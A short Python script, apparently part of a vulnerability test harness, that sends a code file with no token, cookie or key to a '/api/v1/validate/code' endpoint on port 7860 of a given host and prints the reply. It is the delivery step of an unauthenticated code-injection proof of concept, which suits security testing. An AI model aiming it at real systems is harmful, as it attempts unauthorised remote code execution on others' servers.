"""Unauthenticated remote client on the internal network: POSTs inputs/<arm> to /api/v1/validate/code
with no token, cookie or API key."""
import json
import sys
import urllib.error
import urllib.request

arm, nonce, host = sys.argv[1], sys.argv[2], sys.argv[3]
code = open(f"/case/inputs/{arm}.py", encoding="utf-8").read().replace("{{NONCE}}", nonce)
req = urllib.request.Request(f"http://{host}:7860/api/v1/validate/code", data=json.dumps({"code": code}).encode(),
                             method="POST", headers={"Content-Type": "application/json"})
try:
    with urllib.request.urlopen(req, timeout=60) as r:
        print(r.status, r.read()[:300])
except urllib.error.HTTPError as e:
    print(e.code, e.read()[:300])
